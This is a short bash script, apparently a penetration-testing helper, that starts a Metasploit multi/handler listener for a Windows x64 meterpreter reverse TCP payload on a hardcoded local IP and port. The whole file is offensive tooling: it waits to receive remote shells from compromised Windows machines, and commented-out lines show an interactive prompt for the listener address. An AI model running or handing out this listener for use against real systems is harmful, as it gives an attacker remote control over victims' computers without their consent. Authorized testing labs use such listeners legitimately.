#!/bin/bash

# echo "[ ? ] Enter LHOST : "
# read lhost
# echo "[ ? ] Enter LPORT : "
# read lport
# echo "Set LHOST : $lhost"
# echo "Set LPORT : $lport"
# echo "Launching Msfconsole listener"

lhost="192.168.29.200"
lport="8888"

msfconsole -x "use exploit/multi/handler;
set payload windows/x64/meterpreter_reverse_tcp;
set LHOST $lhost;
set LPORT $lport;
exploit;"